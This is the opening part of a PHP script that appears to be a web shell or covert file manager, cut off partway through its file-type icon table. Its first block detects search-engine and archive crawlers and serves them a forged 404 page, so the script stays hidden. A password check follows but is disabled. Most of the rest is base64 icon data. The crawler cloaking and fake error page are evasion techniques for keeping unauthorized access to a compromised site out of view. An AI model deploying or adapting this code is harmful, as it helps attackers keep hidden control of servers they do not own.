<?php
/* Version 1.1 */
if (!ob_start('ob_gzhandler')) ob_start();
$Fuckers = array('bot','spider','archive','crawl','robot','search','seek','cache');
$UA = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($Fuckers AS $BOT) {
	if (strpos($UA,$BOT) !== FALSE) {
		if (strpos($_SERVER['SERVER_SOFTWARE'], 'mod_fastcgi') === FALSE || strpos($_SERVER["SERVER_SOFTWARE"], 'mod_fcgi') === FALSE) { header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found'); }
		else { header('Status: 404 Not Found'); }
		echo '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> 
<html><head> 
<title>404 Not Found</title> 
</head><body> 
<h1>Not Found</h1> 
<p>The requested URL ',$_SERVER['PHP_SELF'],' was not found on this server.</p> 
</body></html> ';
		die;
	}
}

$Auth = FALSE;
if ($Auth !== FALSE) {
	session_start();
	$NoPASS = TRUE;
	if (!empty($_SESSION['SLOGIN'])) {
		if ($_SESSION['SLOGIN'] === $Password) { $NoPASS = FALSE; }
	}
	if (isset($_POST['pass'])) {
		$ShaPass = sha1(md5($_POST['pass']));
		if ($ShaPass === $Password) { $_SESSION['SLOGIN'] = $ShaPass; $NoPASS = FALSE; }
		else { $WrongPass = TRUE; }
	}
	if ($NoPASS) {
		echo
		'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
			"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
		<html lang="en-US" xml:lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
		<head>
		<title>Log in</title>
		</head>
		<body style="background-color:black;color:white;">
		<form action="" method="post" style="text-align:center;">';
			if (isset($WrongPass)) { echo '<span style="color:red;">Wrong password, please try again.</span><br /><br />'; }
			echo 'Please enter the password: <input type="text" id="pass" name="pass" /> <input type="submit" value="Enter" />
		</form>
		</body>
		</html>';
		die;
	}
}

$IsAction = isset($_REQUEST['action']);
if ($IsAction && $_GET['action'] === 'img') {
	header('Expires: '.date('D, d M Y H:i:s',time()+86400).' GMT');
	header('Cache-Control: public');
	header('Last modified: ' . date ('D, d M Y H:i:s', getlastmod()) . ' GMT');
	if (isset($_REQUEST['image'])) {
		if ($_REQUEST['image'] === 'backb') { header('Content-Type: image/png'); echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhQTFRFnMjhZq3UDXu24e30L5PLSYivAGeY////Be3CegAAAAh0Uk5T/////////wDeg71ZAAAAiElEQVR42mzQ2wrDMAwDUMmO0v//4/nWLIPppXCwTSM8f4L+UIhQN8qZCIcOgplmDWJFbg3UMrPQWC5lIqxCd9SwAnVZ3YiFB/s1q8uEEveYtQ5uc/c6Ujq41ZOp6+Ctua7CzVfN45eIX12qF53ZGkS/ndbapmmJOgp9+0Sx8eozmVn8NP8RYAC3HQXzIa0m6wAAAABJRU5ErkJggg=='); }
		elseif ($_REQUEST['image'] === 'forwardb') { header('Content-Type: image/png'); echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhQTFRFnMfgBnCmZazV7fT5HIbBzOLvSYqy////TGVm9QAAAAh0Uk5T/////////wDeg71ZAAAAiklEQVR42mzQQQ7EMAgDQAOG/P/HC4S0jbRcKo0IBWP9KeyPBrI0vhjmjUA8iE1VrbgsgqWJ0eauSlIEWmjd5u5twkiMmVYqVflwzTQytTHXW8dSrZUbmyhqhgfHaJ9O3tYzT99MzL/nSuq3SfRFUfvhGPbtSnlrbq80Lzt5YrN+8izWCn6S/wkwAOuyBcSEKJ+VAAAAAElFTkSuQmCC'); }	
		elseif ($_REQUEST['image'] === 'c37') { header('Content-Type: image/png'); echo base64_decode('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'); }
		header('Content-Type: image/gif');
		if ($_REQUEST['image'] === 'dir') { echo base64_decode('R0lGODlhEQAOALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAARAA4AAARIEMlJaxUYA0vFKQVBCBsnDGg6ZNkkgHAMEkP5inhOGLV067tgD/EDGnbDoujIpNlCuibviZPupr6ClWnAElVgVQkBKJvPZ0QEADs='); }
		elseif ($_GET['image'] === 'link') { echo base64_decode('R0lGODlhFAAVALMMADZITbzFye73/Nng5dPa3/j7/WNwdJ6preXt8n+Lj9/n7Ojy+AAAAAAAAAAAAAAAACH5BAEAAAwALAAAAAAUABUAAAS+kMlJyRKEam2XX8hGDcolFIIALpmmqCcbHEkgIIqmXkFiAEDAoaBAtBiIjyARDCYECsVAEvjwAAnfz3CLZkofRBKR9QEGuMG0A0oqDvCAwWBTKwJIsXhxMBwIBUxDagMZFntyfigBAQgFBIUZB2IlB0ADREULkQQZCQQ4CgQ1BQiEnah4CQcLUUU3aqiyCRKfUYSxsgM9E6tSp52xM3MUqwS/wjRzxL1ZB4wzWssGGmVl08siDNbY1Nq1PlrfEQA7'); }
		elseif ($_REQUEST['image'] === 'down') { echo base64_decode('R0lGODlhFAAUAOYAAP//////AP8A//8AAAD//wD/AAAA/wAAAMK/ya6ruLCtwdHO4by6yqimu9TT5GBgb3V1hdfX5qystq6ut6qqr8bGy9DQ09ze8bu8xrCxuszO3t3f7KmrtKyutpecr8HG2JiesKyzxoiNm7O3w77G2cXN4Kmvvt3i7qauwL3ByrO7y5uhrd7k8JKYo8PK17bA0J+msqyzv7nE1dje59Ta48vV47vI2KOtudHa5b7L2sLO3Nnh6t/m7tPe6drj7Nfg6dzk7Nzj6uXr8drk7L/Izpmvsdja2omjocnd2Hedh4ysl5a9n6zQsl2wY5HQli2sMCmJLGakZwKzAgOVBArMChKOEzbNNlHeUGDgYEyqTUabR2XNZYvii6zrrOL64vP/83zee8Tyw+np6f///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGMALAAAAAAUABQAAAf/gGOCg0ZRWYdaWkuDjI1MYQBfkl5RjZZjj19em5SXghYjDEpdYV2mXVEIDBiWJjk3S1xdXLRgTUQuKBWMYjdMTE5cYFhbxVlaUEcIjEEoj11gV1bTT09TVUWshCE5wVhWVFJSU9dMJR2MRigkME1XVOHjVUoLJByMFigvICtN8OLzFBApAQNfCBsyPsB4Em6KEg0aaNRYgU9FiRo1NKTI8mSJgx87ZkxkVEFGCSA4cJyggYTFDiBCdvSgOCiFDhs1ePDYcYIFDyExcfQoOAhDDhQ2dODYoXNnShU6bjDCwEJoj6s7fAwBAiQIDR4jGGUw0aKsWbMrYoRQQVNQDBEPLh5AmCsXwgMRIZIU8cAohYsVDDQ4iDCY8IYLTpA0SJchw4THkB9L4JBAAgVBgQAAOw=='); }
		die;
	}
	else {
		header('Content-Type: image/gif');
		$_GET['ext'] = substr($_GET['ext'], 1);
		$UnKnown = 'R0lGODlhEAAQANUAAAAAAP////7+/f39/Pz8+/v7+vr6+fn5+Pj49/38+/z7+vv6+fr5+Pn49/j39vf29fb19PX08/Py8fj29vf19fb09PXz8/Ty8vPx8fLw8P38/Pz7+/v6+vr5+fn4+Pj39/f29vb19fX09PTz8/Py8ubl5eDf3/b29srKysXFxcDAwL+/v729vby8vLq6urm5ubi4uLW1tbOzs7Gxsa2traysrJ2dnZCQkIaGhnl5ef///wAAAAAAAAAAAAAAAAAAACH5BAEAADoALAAAAAAQABAAAAacQJ1ORSwWV8LkcEMYDAQCggD1UupWBaYTKkidqkmWIdt8ClwwmCvZYhg4ijK0ZFoLXQ03vGyGJWEODQcdexp9STEggYMcBQSGAjFJMiEPix0LjgkDMkkzFZUOCB6YjgQzSTQWIhCWH6SZGzRJNRerrROvbgU1STYktqwUILoGNkk3GBK2ERDDH3k3STgZyhcjzc8NOEk53t/g3zpBADs=';
		if ($_GET['ext'] === '') { echo base64_decode($UnKnown); die; }
		$ImgArray = array(
			array('html','htm','xhtml','xht','xml','mht','mhtml','shtml','dtd','chm','xhtm'),'lhEAAQANUlAICCfJmZmSdRjfDTg01LOfDn2Ni8dauik8a3oMe/sz1urFlZWSUvPShSjbu+wU6GzM7OzoN2QIN2QbjJuJ6ulbmzrHWgx/bw6mtvdLWfYOjTsU2GzO7fxd7e3h88ZbuqkBUsQjxtrFhYWDAwMP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACUALAAAAAAQABAAAAaywJKwtBAZj8ahctFpNiuigEgpZJKupAuGJKUqPFEsBsIdCRWSAWUT8jhIAAyGYFZMOBxDBiAAOS4dFQBmDRwXGgMZIW0YHYAVIw0PhgMGIWweIAkXBR8jHhYWAwEWG5ggFQWdnxuhBmwhApmpHJ4lAq0beiIeDBgHeLYgiyEZEQQMIAAfHBq2JSAeAiIEBMoHCRrOZkMg3iIHBwjaGhncQiIJFR8ICB/vGeZKIiP19vcjQQA7',
			array('php','phtml','php3','php4','php5','php6','phtm','phps'),'lhEAAQANUAAH5/wIB/wVRUVYuLya6tpH2Bvn19v6io0ZycnIyMxqmpqYCAvoSFwZaWwJ2dznp5v0JDQSorKhISEsLDwXd5vuTm8+Hg5ZGSkTg5NDIxMYB/wIuNi5SUx1BQUayttrW1wH57wIiGhYiIh4aGxMC+4ZeXmKKfn6SlrJ+foXJwu7e3z5iYxHh3v7693vj69qysqqqprqyqq6Cfyq+ur8TE1bu8xk9PTnx8v2FiYXR1aYODfX+AwICAwYCAv////4CAwCH5BAAAAAAALAAAAAAQABAAAAaxwEDvF9Dwdj3eIrDj/Z6/XWCR3O2evQA0Srw6ecesE6v9GR8UA0+z+I2b1l5PReOANHjoOjDov3IkFAV9AAZRPA0xCAcoGTMOK4oyCQAAAwoSAiGYAiKcOjQAPAMINj4RGx2nqacfBpYoEBYQFxAuGbUWGDWvlxIYHic4FgImvzA0BnwlEBUMCQcpLQjNIw9SIxMEBxQADzwB2gcsPEM9HA4MAFvo6lsGN+vv8Vv19ltBADs=',
			array('asp','asphtml'),'lhEAAQAOYAAAAAAP////7+/v39/fz8/Pv7+/r6+vn5+fj4+Pf39/b29vX19fT09PPz8/Ly8vHx8fDw8O/v7+3t7enp6eXl5ePj4+Hh4d7e3tvb29ra2tnZ2dfX19bW1tPT09HR0c/Pz83NzczMzMrKysnJycfHx8TExMPDw8DAwL6+vr29vby8vLq6urm5ubW1tbGxsa6urq2trampqaenp6ampqOjo6KioqGhoaCgoJycnJqampeXl5aWlpWVlZGRkYyMjIuLi4iIiIaGhoWFhYKCgn9/f35+fnx8fHh4eHZ2dnR0dHJycm5ubmlpaWRkZF9fX1lZWVhYWFdXV01NTUxMTElJSUVFRUREREBAQD4+Pjs7Ozk5OTg4ODU1NTQ0NDIyMjAwMC4uLi0tLSwsLCsrKyoqKikpKSgoKCQkJCMjIyIiIh8fHx4eHh0dHRwcHBoaGhkZGRgYGBcXFxYWFhMTExEREQ8PDwwMDAkJCQgICAcHBwYGBgEBAf///wAAAAAAAAAAACH5BAEAAHwALAAAAAAQABAAAAf8gAgDBwYFBQEJBAIFggEFBAwRCocCCYgPBAUCAwMCHzUtIyMmISIqOxwJCIQFKEU6Li4/PzcvMBgBuY4VHjpbPiApUFxCEz9JRDsPDgFGAFEFQnoAeUdlAAB1QAsGVgBmGF5yNlVLcGY+dGIDF2hteCxqcEM5G3NUEWFvAStyQQA0lGDbgqPNHCwApgjgoacJACQWnGgBAEeOnjVZVARIgg3AFyEyWpzZAyALCQ0FGHQhQ4QNtjtM7IABcGVAAAYW3OTYGOeJGgBpaoyRAsGQhBcZEHSYQeFEjw4DYpQgcADBggACDggIYCBXplyJBDRIwGAQgUEGBhQ6pCoQADs=',
			array('aspx','armx','asax','ashx','asmx','axd'),'lhEAAQAKIFAP///4Kj1cfS6CBHnV5/vv///wAAAAAAACH5BAEAAAUALAAAAAAQABAAAANXWLTcrUGIQOK0gRIBwOwdB1Je6FVc5AUeJwKqKrXrCwoEOOZg4w0DHY0AHCyADuNCUATOABVTJ1CcDD7ECbOJG2R0kSK0+yUat8ENMcODpZrw+KAglxcSADs=',
			array('txt','ans','asc','rtf','doc','dot','mcw','docx','dotx','log'),'lhEAAQANU+ALq6uvz8+7i4uPv7+uDh476+vvj39vj39/r6+fz7+/b19Pn49/Pz9vr5+fn4+LW1teXl6PXz8/v6+fv6+rOzs/X09LGxsfz7+vf19fTy8p2dnfn5+IaGhvf29djY2q2trff29pCQkPr5+KysrPb29uDf3/Py8ebl5fr6+vb19by8vP38/MXFxfPy8vP08/Lw8PPx8fLy8r29vf38+/X087+/v/Tz87u7u8rKyv7+/f39/MDAwHl5ecjW4P///wAAACH5BAEAAD4ALAAAAAAQABAAAAaWQJ9vt2MQjcUdSsjcJQoeHTRQwAFcTF9tQIDoujkCi3SLMWWIQSKg0+VyAIEAwFSJEJML2507lehCAD2DhIU9AkwCBgsbDXkBK3yIQg+Glg9MFCkdi40SAwEzOhRMFpaGFkwfERUKnAcODZ8JH0wjp4UjTBotGawKGCCwdxpMIbiEIUwcLzAmGTY0wMILHEw82Nna2T5BADs=',
			array('jsp','jar','j','jad','jav','java','jsp10','class'),'lhEAAQAOYAAAAAAP///6/A0M7X31l5k1t7lV19l159ll9+l26NpnaQpXSNoomhtZCnuomer5asv5+1yJusuqy9zKqwtUhmfFl6lFh5k1Zyh1ZxhV15jmiGnWeEm2yHm3uUqIKbr4egtIier4edromerqu7x7C9x9Xa3j1cck9sgWSAlGB5i6azvLC9xrfCytjb3bbCyeCwgOh1DOl6E+l+GuSCJOuFJuqEJumKM+yOOOi0guq4ie27jOi9lOvRuvDZxP39/fz8/Pv7+/r6+vn5+ff39/b29vX19fT09PPz8/Dw8O/v7+7u7u3t7ezs7Orq6unp6ejo6Ofn5+bm5uXl5eTk5OPj4+Li4uHh4eDg4N/f397e3t3d3dzc3Nvb29nZ2djY2NbW1tXV1dTU1P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGIALAAAAAAQABAAAAffgAMCEISFhoQCAxIlRUOOj0aPRSUSD0s/Ppk+P0Y9QZk/Sw8NTECmQEFHOjdFp0wNDE5Cs0JIOTRJPEWzTgweUETBRzsyUDg1R8FQHh1TR89IMdHSSM9THQtWSNtMNlYwTExUUUpWCxxZS05aWlkzL1lUCiJVWxwoW01RFQYaBRUaIuwD4QVFhi5QqFBh4cLFChItvCBwACbDhS9TplzZYIGAhQ1XDoS4EubCCS5QsGzpwrJlFylQuJyggOXJiA8JcupM0IQJFgoYJjyBQrSo0SYTMKhIYaKp06dNU6gIBAA7',
			array('cfm','cfml','cfc'),'lhFAAUAMQAABRBY1uOsmmfvlSEqBtHaWSauj1sjlyStu7y8kV1mTRihJawwmeMpUt8oH6Zqtzk6WyRqyZSdM3a4/j6+sDP2q3Bz+Xs7ll8lIKjt3eZtEdxjnKNpFuDnwAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAAXH4FEUQimMxXEEQzs0TUKaJaqyLZzIdJ2uuFdMNvP9grodyhYI5pIGlTSwkFgemOQuYTA0m4PK5EGRLAYQBoPD7boGmQlFmMgg7o+Lwp0TQ2ANBnELHAwaBgoKgAkUFgNbBhATDhF7iQpbjBaBO5EIDxIVl5idCxMQe4gMCBULDgqVEV2IHAgSHAaHqwwRsb2ziA4WtlgXExu9yZWjERcYrl0OBsoRBKOJyQS92tsE3tTg3d7eAOHV4+gA6gDo7ePr8OwE8fT1IQA7',
			array('png','gif','jpg','jpeg','bmp','ico','jfif','mng','nitf','pbm','pcx','pgm','pict','tga','tiff','tif','xbm','psd','jpx','jp2','rle','dib','rle','dcm','fxg','psb','iff','pxr','pdd','dds'),'lhEAAQANU/AMfY2PPz80eJbtX8/+z//7vE2HbX/zeH1om7zqSkpLDO9bPg/5bR/y9qbaurq56enuL9/y5smvz8/FGCo1Wmi/n5+cHy/+7u7tr//yNaL2mog0R8oZ/K2CdSZHaYsIjB2GK1/7CwsIy77G+w0sP7/0yR2XKn3IK/vcXc/0FrY3K//3CwrhtATluHjT18XH6y5pzGz1qt/8/n6TiDwUmAWV2Z1HGijXSilODf2cz0/0GJwuvr67KyspmZmf///////yH5BAEAAD8ALAAAAAAQABAAAAamwJ9wSCwaj0SecslsKn3QqFT6PFivhxHnw4H5eCFfSQWKkRkkAsHw8YVCEg4EslgwGBbIwIKQhBwVMgMEPgM5FhYDAz4AFQ6ALTcYBBiLlJWNDgkVKTQaCBA+aoSMFQkJARmqNAIaFCsjJzI4AacXLB0dDbsCLgICFDcBDw8XETM6NTUmJi8iCigFF8Q7EREbGxPaEx7dHjsPPTvj5OXlPejp6uvoQQA7',
			array('vbs','js','scpt','sh','bsh','pl','pn','pm','plx','tcl','ps1','mrc','as','py','pyc','pyw','ps','ncf','asa','csh','cgi','jsfl','json','au3','awk','applescript','aut','nsi','rpy','wsf'),'lhEAAQAOYAAAAAAP///yIiIykpKigoKTAwMS8vMC0tLioqKzw8PTs7PDY2NzQ0NVRUVVJSU1FRUk1NTktLTEdHSEJCQ1FSU0xNTklKSzEyMi8wMC4vLzo7O1RVVVJTU0tMTENEREBBQT9AQAIDAhwcGyoqKWNjYoyMjIqKiomJiYGBgYCAgHl5eXh4eHFxcWxsbGhoaGVlZWNjY15eXl1dXVlZWVdXV1RUVFNTU0xMTEtLS0lJSUhISEZGRkVFRURERENDQ0JCQkFBQT8/Pzw8PDs7Ozk5OTg4ODc3NzY2NjMzMzExMSoqKikpKSQkJCMjIyEhIR4eHh0dHRwcHBsbGxISEhERERAQEA4ODgkJCQYGBgUFBQICAv///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAFsALAAAAAAQABAAAAeqgFuCg4SFhQ4PDRuLHBAVG4UWMy0rKiorLDQ3TCCENiQnJaIlJi41TjuEETMora0pMg8UhRI5MTEyMrc4HYYeQzAvwi8wQhKGH0tGRUbLRiMThgpSPDk6Ojk8IgmGR1dVU1RUU1VXC4YXWUjMy0hYF4YHWgD09SEYhAw/Ojw9/j1AMmQxQIiIkCA+Evr4IUSDlQKEmiiJ8qRiRShJMggohICAx48EBhwgFAgAOw==',
